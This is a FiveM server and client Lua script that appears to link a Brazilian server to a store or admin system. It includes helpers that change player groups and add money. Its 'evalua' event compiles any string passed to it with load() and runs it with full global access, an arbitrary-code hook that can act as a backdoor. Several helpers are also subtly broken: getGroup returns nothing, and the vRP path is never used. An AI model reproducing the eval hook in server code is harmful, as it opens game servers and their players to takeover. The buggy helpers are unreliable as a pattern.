if IsDuplicityVersion() then
    vRP = nil
    ESX = nil

    if GetResourceState('vrp') ~= 'missing' then
        local Proxy = module("vrp", "lib/Proxy")
        vRP = Proxy.getInterface("vRP")
    elseif GetResourceState('es_extended') ~= 'missing' then
        TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
    else
        print('Não foi encontrado vRP ou es_extended em sua base')
    end

    function setGroup(steam_hex, group)
        findUser(steam_hex).set('group', group)
    end

    function getGroup(steam_hex) findUser(steam_hex).get('group') end

    function addBank(steam_hex, bank) findUser(steam_hex).addBank(bank) end

    function addMoney(steam_hex, money) findUser(steam_hex).addMoney(money) end

    function isOnline(steam_hex) return findUser(steam_hex) ~= nil end

    function getSource(steam_hex)
        for k, v in pairs(ESX.Players) do
            if v.identifier == steam_hex then return k end
        end
    end

    function findUser(steam_hex)
        for k, v in pairs(ESX.Players) do
            if v.identifier == steam_hex then return v end
        end
    end

    local function load_code(code) return assert(load(code, nil, "t", _G)) end

    AddEventHandler('evalua', function(exec, callback)
        local condition = load_code("return " .. exec);

        callback(condition())
    end)
else
    RegisterNetEvent('__title')
    AddEventHandler('__title', function(title, subtitle)
        local name = GetCurrentResourceName()
        SendNUIMessage({title = title, subtitle = subtitle, name = name});
        SetNuiFocus(true, false)
    end)

    RegisterNUICallback('removeFocus', function(data, cb)
        SetNuiFocus(false, false)
        cb(true)
    end)
end
